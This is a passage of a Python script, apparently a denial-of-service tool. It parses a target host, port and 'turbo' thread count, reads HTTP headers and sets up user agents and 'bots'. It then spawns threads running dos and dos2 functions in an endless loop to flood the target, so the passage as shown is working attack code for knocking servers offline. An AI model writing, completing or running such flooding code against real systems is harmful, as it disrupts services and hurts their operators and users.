    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
# task queue are q,w
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mcheck server ip and port\033[0m")
        usage()
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
        start = time.time()
        # tasking
        item = 0
        while True:
            if (item > 1800):  # for no memory crash
                item = 0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()

